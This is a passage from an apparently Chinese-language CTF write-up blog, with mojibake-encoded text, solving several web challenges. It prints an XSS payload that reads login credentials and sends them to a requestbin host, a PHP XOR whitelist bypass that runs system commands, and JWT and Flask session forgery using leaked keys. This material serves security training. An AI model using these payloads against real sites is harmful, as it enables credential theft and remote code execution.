class="variable">$val</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">		                <span class="variable">$feedback</span> = str_ireplace(<span class="variable">$val</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$feedback</span>);</span><br><span class="line">		            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		                <span class="keyword">break</span>;</span><br><span class="line">		            &#125;</span><br><span class="line">		        &#125;</span><br><span class="line">		    &#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å°è¯•å†™å…¥<code>&lt;scricookiept&gt;alert(1)&lt;/scrcookieipt&gt;</code>ï¼Œä¹‹åå†è¿›è¡Œè®¿é—®ï¼Œå¯ä»¥å‘ç°å¯èƒ½å­˜åœ¨xssæ”»å‡»ï¼Œä½†æ˜¯ä¹‹åä¸çŸ¥é“è¯¥æ€ä¹ˆåˆ©ç”¨åå°„æ€§xssæ”»å‡»å»è¯»å–flag</p>
<p><img src="https://img-blog.csdnimg.cn/1966826b62964206acb541412d11e7c2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>ä¹‹åçœ‹ç™»é™†ç•Œé¢çš„jsæºç ï¼Œè´¦æˆ·å’Œå¯†ç éƒ½è¢«å¡«å…¥äº†è¡¨å•ï¼Œé‚£ä¹ˆçŒœæµ‹flagæˆ–è®¸å¯èƒ½æ˜¯è´¦æˆ·æˆ–è€…å¯†ç ï¼Œé‚£ä¹ˆå¯ä»¥æ„é€ pocè·å–å¯†ç å’Œè´¦æˆ·ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.cookie &amp;&amp; <span class="built_in">document</span>.cookie != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie.split(<span class="string">&#x27;; &#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> cookie = &#123;&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cookies.length; i++) &#123;</span><br><span class="line">		<span class="keyword">var</span> arr = cookies[i].split(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">		<span class="keyword">var</span> key = arr[<span class="number">0</span>];</span><br><span class="line">		cookie[key] = arr[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">typeof</span>(cookie[<span class="string">&#x27;user&#x27;</span>]) != <span class="string">&quot;undefined&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(cookie[<span class="string">&#x27;psw&#x27;</span>]) != <span class="string">&quot;undefined&quot;</span>)&#123;</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">&quot;username&quot;</span>)[<span class="number">0</span>].value = cookie[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">&quot;password&quot;</span>)[<span class="number">0</span>].value = cookie[<span class="string">&#x27;psw&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pocï¼ˆè¿™é‡Œå¯ä»¥åˆ©ç”¨requestbinï¼‰ï¼Œä¹‹åå°±å¯ä»¥åœ¨requestbiné‚£é‡Œè·å–åˆ°ä»£ç æ‰§è¡Œçš„ä¿¡æ¯ï¼Œå¾—åˆ°flagï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;inpcookieut type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;&lt;/inpcookieut&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">inpcookieut</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">inpcookieut</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">scricookiept</span> <span class="attr">scookierc</span>=<span class="string">&quot;./js/login.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">scricookiept</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">scricookiept</span>&gt;</span></span></span><br><span class="line"><span class="xml">	var uname = documcookieent.getElemcookieentsByName(&quot;username&quot;)[0].value;</span></span><br><span class="line"><span class="xml">	var passwd = documcookieent.getElemcookieentsByName(&quot;password&quot;)[0].value;</span></span><br><span class="line"><span class="xml">	var res = uname + &quot; &quot; + passwd;</span></span><br><span class="line"><span class="xml">	documcookieent.locacookietion=&quot;http://http.requestbin.buuoj.cn/*/?a=&quot;+res;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">scricookiept</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h4 id="NESTCTF-2019-Love-Math-2"><a href="#NESTCTF-2019-Love-Math-2" class="headerlink" title="[NESTCTF 2019]Love Math 2"></a>[NESTCTF 2019]Love Math 2</h4><p>ä¹‹å‰åšè¿‡ç±»ä¼¼çš„é¢˜ç›®</p>
<p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>å®¡è®¡ä»£ç +å®¡é¢˜</strong></p>
<p>è§„å®šgetä¼ å…¥çš„å€¼é•¿åº¦è¦å°äº60ï¼Œä¸”ä¸èƒ½æœ‰ç©ºæ ¼ç­‰ç‰¹æ®Šç¬¦å·ï¼Œé™¤æ­¤ä¹‹å¤–å¯¹äºä½¿ç”¨çš„æ•°å­¦å‡½æ•°è¿›è¡Œäº†é™åˆ¶ï¼Œä½†æ˜¯çœ‹è¿‡ä¹‹åæ²¡æœ‰å¯ä»¥åœ¨å­—ç¬¦å’Œæ•°å€¼ä¹‹é—´è½¬æ¢çš„å‡½æ•°ï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯ä¸èƒ½ç›´æ¥åˆ©ç”¨çš„</p>
<p>é‚£æˆ–è®¸æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å–åæˆ–è€…å¼‚æˆ–è¿ç®—æ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å‡½æ•°</p>
<p>æ¯”å¦‚æˆ‘ä»¬åƒæ‰§è¡Œçš„ä»£ç ä¸ºï¼š<code>system(&#39;cat /flag&#39;);</code>ä¹Ÿå¯ä»¥æ„é€ <code>$_GET[1]($_GET[2]);</code></p>
<p>å¯ä»¥è¯•ç€å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;1234567890!@#$%^&amp;*()_+=-&#x27;</span>;</span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$whitelist</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="comment"># code...</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt; <span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$k</span> = <span class="number">0</span>;<span class="variable">$k</span> &lt; <span class="number">9</span>;<span class="variable">$k</span>++)&#123;</span><br><span class="line">                <span class="comment">// echo $value.&quot;\n&quot;;</span></span><br><span class="line">                <span class="comment">// echo ($j.$k).&quot;\n&quot;;</span></span><br><span class="line">                <span class="variable">$a</span> = (<span class="variable">$value</span> ^ <span class="variable">$j</span>.<span class="variable">$k</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$a</span> == <span class="string">&#x27;_G&#x27;</span> || <span class="variable">$a</span> == <span class="string">&#x27;ET&#x27;</span>)</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;^&quot;</span>.(<span class="variable">$j</span>.<span class="variable">$k</span>).<span class="string">&quot; = <span class="subst">$a</span>&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">                    <span class="variable">$b</span> = <span class="variable">$value</span> ^ (<span class="variable">$j</span>.<span class="variable">$k</span>.<span class="variable">$i</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$b</span> == <span class="string">&#x27;SYS&#x27;</span> || <span class="variable">$b</span> == <span class="string">&#x27;GET&#x27;</span>)</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;^&quot;</span>.(<span class="variable">$j</span>.<span class="variable">$k</span>.<span class="variable">$i</span>).<span class="string">&quot; = <span class="subst">$b</span>&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// echo &quot;\n&quot;;</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment"># is_finite^64 = _G</span></span><br><span class="line"><span class="comment"># is_infinite^64 = _G</span></span><br><span class="line"><span class="comment"># is_nan^64 = _G</span></span><br><span class="line"><span class="comment"># mt_getrandmax^23 = _G</span></span><br><span class="line"><span class="comment"># mt_rand^23 = _G</span></span><br><span class="line"><span class="comment"># mt_srand^23 = _G</span></span><br><span class="line"><span class="comment"># rad2deg^75 = ET</span></span><br><span class="line"><span class="comment"># rand^75 = ET</span></span><br><span class="line"><span class="comment"># srand^475 = GET</span></span><br><span class="line"><span class="comment"># tan^15 = ET</span></span><br><span class="line"><span class="comment"># tanh^15 = ET</span></span><br></pre></td></tr></table></figure>

<p>æœ€åé€‰æœ€çŸ­çš„å‡ ä¸ªæ¥ç»„æˆpayloadå§ï¼šï¼ˆæ³¨æ„è¿™é‡Œçš„64çš„ç±»å‹è¦æ˜¯å­—ç¬¦ä¸²</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=ls%20/</span><br></pre></td></tr></table></figure>

<p>ä¹‹åcatä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°flagäº†</p>
<h4 id="BSidesCF-2019-Pick-Tac-Toe"><a href="#BSidesCF-2019-Pick-Tac-Toe" class="headerlink" title="[BSidesCF 2019]Pick Tac Toe"></a>[BSidesCF 2019]Pick Tac Toe</h4><p>æ‰“å¼€é¶æœºï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆç‚¹å‡»æ²¡ååº”ï¼ŒF12ä¹‹åå‘ç°cookieé‡Œé¢æœ‰sessionï¼Œä½†æ˜¯base64è§£ç ä¹‹ååªçœ‹å‡ºæ¥äº†åˆsessionidï¼Œä¹‹åæŸ¥çœ‹äº†ä¸€ä¸‹æºç ï¼Œå‘ç°åŸæ¥æ¯ä¸ªæ ¼å­éƒ½å¯¹åº”ç€ä¸€ä¸ªid</p>
<p><img src="https://img-blog.csdnimg.cn/67f21a816e3346db8c865c1dfeb09261.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>å¹¶ä¸”æœ‰<code>action=/move</code>è€Œinputæ ‡ç­¾å¯ä»¥åˆ©ç”¨moveè¾“å…¥å¯¹åº”çš„å€¼ï¼Œé‚£ä¹ˆéšä¾¿è¯•ä¸€ä¸‹ï¼Œå¥½å˜›ï¼Œè¿™ä¸å°±æ˜¯æˆ‘ä»¬ç»å¸¸ç©çš„äº•å­—æ£‹å˜›<img src="https://img-blog.csdnimg.cn/ba82e29e7954461e9be303f5d075062d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>é‚£å°±ç›´æ¥é€‰ä¸‰ä¸ªå¯ä»¥è¿èµ·æ¥çš„è¿›è¡Œpostä¼ å€¼å°±å¯ä»¥å¾—åˆ°flagäº†</p>
<p>payloadï¼šï¼ˆç›´æ¥å¼ºåˆ¶æ€§ä¼ å°±å¥½å•¦ å³ä½¿brå¤„å‡ºç°äº†åœ†åœˆä¹Ÿä¸ä¼šæœ‰ä»€ä¹ˆå½±å“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">move=c</span><br><span class="line">move=ul</span><br><span class="line">move=br</span><br></pre></td></tr></table></figure>

<h4 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h4><ul>
<li>jwt</li>
</ul>
<p>æ‰“å¼€é¶æœºï¼Œå¼€å§‹æ˜¯ç™»é™†æ³¨å†Œï¼Œå…ˆè¯•ä¸€ä¸‹adminä¸‡èƒ½å¯†ç ç™»å½•ï¼Œæ²¡æœ‰æˆåŠŸï¼Œæ³¨å†Œadminå‘ç°adminç”¨æˆ·å·²å­˜åœ¨ï¼Œé‚£å…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·è¿›å»å§</p>
<p>ç„¶åå‘ç°æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œéƒ½è¯•äº†ä¸€éä¹‹åå¯ä»¥ç¡®å®šä¸æ˜¯æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´äº†</p>
<p><img src="https://img-blog.csdnimg.cn/9116b9c5c52447c3a8fe11ef3dfcd4bd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>æŠ“åŒ…ä¹‹åå‘ç°cookieé‡Œé¢æœ‰sessionidï¼Œæ ¼å¼æ˜æ˜¾å°±æ˜¯jwtï¼Œç›´æ¥è§£ç çœ‹çœ‹</p>
<p><img src="https://img-blog.csdnimg.cn/b9621411185b4f03a5346cc3756b175b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>è¯´æ˜æˆ‘ä»¬å¯ä»¥ä¼ªé€ æˆ‘ä»¬çš„èº«ä»½ä¸ºadminï¼Œç„¶åè¿›å»çœ‹çœ‹ï¼Œä½†æ˜¯ç°åœ¨é‡ç‚¹æ˜¯æ€ä¹ˆè·å¾—å¯†é’¥</p>
<p>é‡äº‹ä¸å†³ï¼Œæ‰«ä¸€ä¸‹åå°æŠŠï¼Œå‘ç°æœ‰robots.txtï¼ˆå¤ªä¹…æ²¡åšé¢˜ï¼Œå¯¼è‡´æœ‰æ—¶å€™åº”è¯¥èƒ½ç›´æ¥è‡ªå·±è¯•å‡ºæ¥çš„ä¸œè¥¿è¦ä»å¤´å¼€å§‹è¿‡äº†å®³</p>
<p><img src="https://img-blog.csdnimg.cn/1a490bf975cc483085c6479fbbf1163f.png" alt="img"></p>
<p>æŸ¥çœ‹robots.txtä¹‹åå¯ä»¥å¾—åˆ°å¯†é’¥å•¦ï¼š<code>you-will-never-guess</code></p>
<p>ç›´æ¥è§£å¯†ä¹‹ååŠ å¯†ï¼ŒæŠ“åŒ…æ”¾åŒ…ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/af8428d257eb4a7ab2255990f6d7bada.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>å‘ç°æœ‰flag.pngï¼Œä½†æ˜¯å‘ç°ä¸ªé—®é¢˜ï¼Œç›´æ¥è®¿é—®æ˜¯å¾—ä¸åˆ°flagçš„ï¼Œæƒ³åˆ°ä¹‹å‰å¯ä»¥åˆ©ç”¨curlä¸‹è½½æ–‡ä»¶</p>
<p><img src="https://img-blog.csdnimg.cn/3d8a1e915f6f4a478d35f353cec9e4f7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>ç”¨curlè¯•äº†å¥½å¤šå‘½ä»¤ä¹‹åï¼Œæ²¡æƒ³åˆ°ç›´æ¥curl urlå°±å¯ä»¥å¾—åˆ°flagäº†ï¼Œè¿˜å¾—ç»§ç»­å­¦ä¹ curlçš„ç”¨é€”å‘¢</p>
<p><img src="https://img-blog.csdnimg.cn/ec5ef169a68a42e5b67949a925b50a01.png" alt="img"></p>
<h4 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h4><ul>
<li>flask sessionä¼ªé€ </li>
</ul>
<p>æ‰“å¼€é¶æœºï¼Œç™»å½•é¡µé¢æ²¡æœ‰é™åˆ¶ï¼Œç™»å½•è¿›å»ä¹‹åæœ‰uploadç•Œé¢ï¼Œä½†æ˜¯æ²¡æœ‰æƒé™ï¼Œå¹¶ä¸”3ç§’ä¹‹åè‡ªåŠ¨è¿”å›é¦–é¡µï¼ŒF12æŸ¥çœ‹cookieä¹‹åå‘ç°æœ‰sessionå€¼ï¼Œæ ¼å¼å¾ˆåƒjwtï¼Œä½†æ˜¯jwtè§£ç ä¹‹åå‡ºç°ä¹±ç ï¼Œé‚£ä¹Ÿå¯èƒ½æ˜¯flask sessionï¼Œç”¨è„šæœ¬å¼ºåˆ¶è§£ç ä¹‹åå¯ä»¥å¾—åˆ°ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/98135d0238f04408884d2484d82f84a6.png" alt="img"></p>
<p>å…¶ä¸­ï¼Œåé¢çš„usernameå’Œpasswordè§£ç ä¹‹åéƒ½æ˜¯defaultï¼Œé‚£ä¹ˆçŒœæµ‹å¦‚æœæŠŠusernameæ”¹æˆadminä¼šæ€ä¹ˆæ ·ï¼Œä½†æ˜¯æ²¡æœ‰å¯†é’¥ï¼Œé‚£ä¹ˆè¯•ç€çœ‹çœ‹robots.txtæœ‰æ²¡æœ‰æç¤ºï¼Œå‘ç°æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œè™½ç„¶è¿”å›äº†<code>404 not found</code>ä½†æ˜¯é¡µé¢åŠ è½½æ˜¯200ï¼Œè¯´æ˜æ˜¯å­˜åœ¨è¿™ä¸ªæ–‡ä»¶çš„ï¼Œå¯ä»¥åœ¨F12ä¹‹åå‘ç°æŸä¸ªç‰¹åˆ«çš„å†…å®¹ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/2c3d0aa3044046fa8dafb9a84943a1cc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>base64è§£ç ä¹‹åå¾—åˆ°å¯†é’¥ï¼šï¼ˆè™½ç„¶ä¸ç¡®å®šåé¢çš„é‚£äº›ç¬¦å·æ˜¯ä¸æ˜¯ï¼Œå…ˆæµ‹è¯•ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/3aaeade9571a40fb9b2ce41770ed1dbc.png" alt="img"></p>
<p>å¯ä»¥å‘ç°æ˜¯æ­£ç¡®çš„å‘¢ï¼Œé‚£å°±ç›´æ¥ä¼ªé€ å•¦ï¼ˆè¿™é‡Œæ˜¯è¯•äº†å¥½å¤šæ¬¡ä¹‹åï¼Œéƒ½ä¸å¯¹ï¼Œçœ‹äº†åˆ«çš„å¸ˆå‚…çš„wpä¹‹å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;id&#x27;: b&#x27;1&#x27;, &#x27;is_login&#x27;: True, &#x27;password&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å¾—åˆ°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.Yek0bA.1lnXSowFDjHbyuAnUGKfWtYEN84</span><br></pre></td></tr></table></figure>

<p>æŠ“åŒ…ä¿®æ”¹ä¹‹åå°±è·å¾—äº†æ–‡ä»¶ä¸Šä¼ çš„æƒé™ï¼Œçœ‹æºç å¯ä»¥å¾—åˆ°æ–‡ä»¶ä¸Šä¼ çš„pythonæºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;id&#x27;</span>] != <span class="string">b&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        name = name+<span class="string">&#x27;qweqweqwe&#x27;</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span 